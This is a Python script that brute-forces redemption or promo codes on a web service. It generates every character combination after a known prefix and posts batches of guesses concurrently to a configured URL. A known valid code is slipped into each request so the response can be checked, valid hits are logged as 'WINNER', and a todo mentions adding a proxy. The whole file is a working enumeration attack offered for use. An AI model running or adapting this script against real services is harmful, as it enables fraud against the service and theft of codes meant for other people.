#! /usr/bin/env python
# -*- coding: utf-8 -*-

import time

import math
from collections import deque
from itertools import product

import asyncio
import aiohttp

from config import VALID_CODE, URL, MAX_CLIENTS, CODE_PREFIX, DEBUG, CODE_CHARS

VALID_RESPONSE = 'Valid'
INVALID_RESPONSE = 'Invalid'
DUPLICATED_RESPONSE = 'Duplicated'

# todo proxy server =)
# todo storage to db?
# todo storage to fs?
# todo remove validation request (3 codes tasks)


class Storage(object):

    codes = deque()
    valid_codes = []
    invalid_codes = []

    def __init__(self):
        combination_len = len(VALID_CODE) - len(CODE_PREFIX)
        log('Generate code by len %s' % combination_len)
        for comination in product(CODE_CHARS, repeat=combination_len):
            code = '%s%s' % (CODE_PREFIX, ''.join(comination))
            log('add code %s' % code)
            self.codes.append(code)
        log('Gen %d codes' % len(self.codes))

    def get_code_for_check(self):
        return self.codes.pop()

    def save_parsed_code(self, code: str, valid: bool):
        if valid:
            self.valid_codes.append(code)
        else:
            self.invalid_codes.append(code)


def log(msg, force=False):
    # todo use logging
    if DEBUG or force:
        print(msg)


async def task(pid, storage: Storage, sem: asyncio.Semaphore):
    async with sem:
        log('Fetch async process {} started'.format(pid))
        start = time.time()
        codes = []
        try:
            codes.append(storage.get_code_for_check())
        except IndexError:
            codes.append('')

        try:
            codes.append(storage.get_code_for_check())
        except IndexError:
            codes.append('')

        async with aiohttp.ClientSession() as session:
            async with session.post(URL, data={'codes': [VALID_CODE, *codes]}) as resp:
                response_json = await resp.json()
                log(response_json)
                log('Process {}: {} {}, took: {:.2f} seconds'.format(
                    pid, codes, response_json, time.time() - start))

                if response_json['result'][0]['status'] != VALID_RESPONSE:
                    log('Invalid response %s' % response_json)
                    return

                for i, r in enumerate(response_json['result'][1:]):
                    is_valid = r['status'] == VALID_RESPONSE
                    log('save code %s %s' % (codes[i], int(is_valid)))
                    storage.save_parsed_code(codes[i], is_valid)

                    if is_valid:
                        log('WINNER %s' % codes[i], True)

                    if r['status'] not in {VALID_RESPONSE, INVALID_RESPONSE, DUPLICATED_RESPONSE}:
                        log('UNKNOWN STATUS %s' % r['status'], True)


async def run():
    storage = Storage()
    sem = asyncio.Semaphore(MAX_CLIENTS)
    task_count = math.ceil(len(storage.codes) / 2)  # 2 code per request (1 code for validation response)
    log('Create %d tasks' % task_count, True)
    start = time.time()
    # noinspection PyTypeChecker
    tasks = [asyncio.ensure_future(task(i, storage, sem)) for i in range(1, task_count)]
    await asyncio.wait(tasks)
    end_time = time.time() - start
    log("Process took: %.2f seconds (%.2f req/sec)" % (end_time, task_count / end_time), True)
    log('Result: invalid codes %d; valid codes %d; codes (%s)' % (len(storage.invalid_codes), len(storage.valid_codes),
                                                                  storage.valid_codes), True)


if __name__ == '__main__':
    log('Start %s clients:' % MAX_CLIENTS, True)
    ioloop = asyncio.get_event_loop()
    ioloop.run_until_complete(run())
    ioloop.close()
